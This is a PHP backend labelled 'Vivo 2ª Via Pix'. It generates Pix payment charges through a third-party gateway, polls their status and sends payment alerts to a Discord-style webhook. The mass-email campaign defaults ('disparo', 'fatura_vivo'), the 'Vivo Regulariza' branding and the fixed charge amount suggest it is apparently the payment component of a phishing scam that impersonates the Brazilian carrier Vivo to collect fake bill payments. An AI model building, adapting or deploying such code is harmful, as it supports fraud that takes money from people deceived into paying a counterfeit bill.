<?php
/**
 * API Backend - Vivo 2ª Via Pix (BravoPay Gateway)
 */

require_once __DIR__ . '/config.php';

// Headers CORS
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With');
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

header('Content-Type: application/json; charset=utf-8');

// Recebe dados do POST (JSON ou Form)
$rawInput = file_get_contents('php://input');
$jsonData = json_decode($rawInput, true) ?: [];
$requestData = array_merge($_GET, $_POST, $jsonData);

$action = $requestData['action'] ?? ($_SERVER['REQUEST_METHOD'] === 'POST' ? 'create_pix' : 'check_status');

/**
 * Função para registrar logs
 */
function write_log($message, $data = null) {
    if (!defined('LOG_FILE')) return;
    $date = date('Y-m-d H:i:s');
    $log = "[{$date}] {$message}";
    if ($data !== null) {
        $log .= " | " . (is_string($data) ? $data : json_encode($data, JSON_UNESCAPED_UNICODE));
    }
    $log .= PHP_EOL;
    @file_put_contents(LOG_FILE, $log, FILE_APPEND);
}

/**
 * Função para enviar Webhook externo (Discord, n8n, Make, UTMify ou API customizada)
 */
function send_external_webhook($event, $payload) {
    if (!defined('EXTERNAL_WEBHOOK_URL') || empty(EXTERNAL_WEBHOOK_URL)) {
        return;
    }

    $url = EXTERNAL_WEBHOOK_URL;
    $isDiscord = strpos($url, 'discord.com/api/webhooks') !== false;

    if ($isDiscord) {
        $color = ($event === 'pix.approved' || $event === 'transaction.paid') ? 3066993 : 16753920; // Verde ou Laranja
        $title = ($event === 'pix.approved' || $event === 'transaction.paid') ? '✅ PIX PAGO COM SUCESSO! - VIVO' : '⏳ NOVO PIX GERADO (PENDENTE) - VIVO';
        
        $body = [
            'embeds' => [
                [
                    'title' => $title,
                    'color' => $color,
                    'fields' => [
                        ['name' => '📧 Cliente / Email', 'value' => $payload['customer_email'] ?? 'Não informado', 'inline' => true],
                        ['name' => '💰 Valor', 'value' => 'R$ ' . number_format(($payload['amount_cents'] ?? 6254) / 100, 2, ',', '.'), 'inline' => true],
                        ['name' => '🆔 ID da Transação', 'value' => $payload['transaction_id'] ?? 'N/A', 'inline' => false],
                        ['name' => '⏱ Data/Hora', 'value' => date('d/m/Y H:i:s'), 'inline' => true]
                    ],
                    'footer' => ['text' => 'Vivo Regulariza • BravoPay Integration']
                ]
            ]
        ];
    } else {
        $body = [
            'event' => $event,
            'timestamp' => date('c'),
            'data' => $payload
        ];
    }

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS => json_encode($body),
        CURLOPT_TIMEOUT => 5
    ]);
    curl_exec($ch);
    curl_close($ch);

    write_log("Disparado webhook externo ({$event})", $payload);
}

// -------------------------------------------------------------
// ROTA: CRIAR COBRANÇA PIX
// -------------------------------------------------------------
if ($action === 'create_pix') {
    $email = filter_var($requestData['email'] ?? '', FILTER_VALIDATE_EMAIL) ?: 'cliente@vivo.com.br';
    $name = trim($requestData['name'] ?? $requestData['nome'] ?? 'Cliente Vivo');
    if (empty($name)) $name = 'Cliente Vivo';
    $cpf = preg_replace('/\D/', '', $requestData['cpf'] ?? '');

    $externalRef = 'vivo_' . time() . '_' . mt_rand(1000, 9999);

    // Captura parâmetros UTM para atribuição / UTMify
    $utm = [
        'source' => $requestData['utm_source'] ?? 'email',
        'medium' => $requestData['utm_medium'] ?? 'disparo',
        'campaign' => $requestData['utm_campaign'] ?? 'fatura_vivo',
        'content' => $requestData['utm_content'] ?? '',
        'term' => $requestData['utm_term'] ?? '',
        'fbclid' => $requestData['fbclid'] ?? '',
        'gclid' => $requestData['gclid'] ?? '',
        'ttclid' => $requestData['ttclid'] ?? ''
    ];

    $payload = [
        'amount_cents' => AMOUNT_CENTS,
        'method' => 'pix',
        'customer' => [
            'email' => $email,
            'name' => $name
        ],
        'description' => BILL_DESCRIPTION,
        'external_reference' => $externalRef,
        'utm' => $utm
    ];

    if (!empty($cpf) && strlen($cpf) >= 11) {
        $payload['customer']['cpf'] = $cpf;
    }

    // Chamada à API BravoPay
    $ch = curl_init('https://bravopay.club/api/v1/transactions');
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => [
            'Authorization: Bearer ' . BRAVOPAY_API_KEY,
            'Content-Type: application/json'
        ],
        CURLOPT_POSTFIELDS => json_encode($payload),
        CURLOPT_TIMEOUT => 15
    ]);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError = curl_error($ch);
    curl_close($ch);

    if ($curlError) {
        write_log("Erro cURL BravoPay", $curlError);
        http_response_code(500);
        echo json_encode(['error' => 'Falha na conexão com gateway de pagamento. ' . $curlError]);
        exit;
    }

    $resData = json_decode($response, true);

    if ($httpCode >= 200 && $httpCode < 300 && isset($resData['id'])) {
        write_log("PIX Gerado com sucesso: ID {$resData['id']}", [
            'email' => $email,
            'amount_cents' => AMOUNT_CENTS
        ]);

        // Dispara Webhook Externo de Pendente
        send_external_webhook('pix.pending', [
            'status' => 'PENDING',
            'transaction_id' => $resData['id'],
            'customer_email' => $email,
            'customer_name' => $name,
            'amount_cents' => AMOUNT_CENTS,
            'copy_paste' => $resData['pix']['copy_paste'] ?? '',
            'expires_at' => $resData['pix']['expires_at'] ?? null,
            'created_at' => $resData['created_at'] ?? date('c')
        ]);

        echo json_encode([
            'success' => true,
            'id' => $resData['id'],
            'status' => $resData['status'] ?? 'PENDING',
            'amount_cents' => $resData['amount_cents'] ?? AMOUNT_CENTS,
            'pix' => [
                'copy_paste' => $resData['pix']['copy_paste'] ?? '',
                'expires_at' => $resData['pix']['expires_at'] ?? ''
            ],
            'customer' => [
                'email' => $email,
                'name' => $name
            ]
        ], JSON_UNESCAPED_UNICODE);
        exit;
    } else {
        write_log("Erro ao gerar PIX BravoPay", $resData);
        http_response_code($httpCode ?: 400);
        echo json_encode([
            'error' => $resData['error']['message'] ?? 'Não foi possível gerar a cobrança Pix.',
            'details' => $resData
        ], JSON_UNESCAPED_UNICODE);
        exit;
    }
}

// -------------------------------------------------------------
// ROTA: VERIFICAR STATUS DO PAGAMENTO
// -------------------------------------------------------------
if ($action === 'check_status') {
    $id = trim($requestData['id'] ?? '');

    if (empty($id)) {
        http_response_code(400);
        echo json_encode(['error' => 'ID da transação não fornecido.']);
        exit;
    }

    $ch = curl_init("https://bravopay.club/api/v1/transactions/" . urlencode($id));
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => [
            'Authorization: Bearer ' . BRAVOPAY_API_KEY
        ],
        CURLOPT_TIMEOUT => 10
    ]);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $resData = json_decode($response, true);

    if ($httpCode === 200 && isset($resData['status'])) {
        $status = strtoupper($resData['status']);

        // Se pago, dispara webhook de aprovado
        if ($status === 'PAID') {
            $cacheFile = sys_get_temp_dir() . '/notif_' . md5($id);
            if (!file_exists($cacheFile)) {
                @touch($cacheFile);
                send_external_webhook('pix.approved', [
                    'status' => 'PAID',
                    'transaction_id' => $resData['id'],
                    'customer_email' => $resData['customer']['email'] ?? '',
                    'customer_name' => $resData['customer']['name'] ?? '',
                    'amount_cents' => $resData['amount_cents'] ?? AMOUNT_CENTS,
                    'paid_at' => $resData['paid_at'] ?? date('c')
                ]);
            }
        }

        echo json_encode([
            'success' => true,
            'id' => $resData['id'],
            'status' => $status,
            'paid_at' => $resData['paid_at'] ?? null,
            'amount_cents' => $resData['amount_cents'] ?? null
        ], JSON_UNESCAPED_UNICODE);
        exit;
    } else {
        http_response_code($httpCode ?: 404);
        echo json_encode([
            'error' => 'Transação não encontrada ou erro na consulta.',
            'details' => $resData
        ], JSON_UNESCAPED_UNICODE);
        exit;
    }
}

http_response_code(404);
echo json_encode(['error' => 'Ação inválida.']);
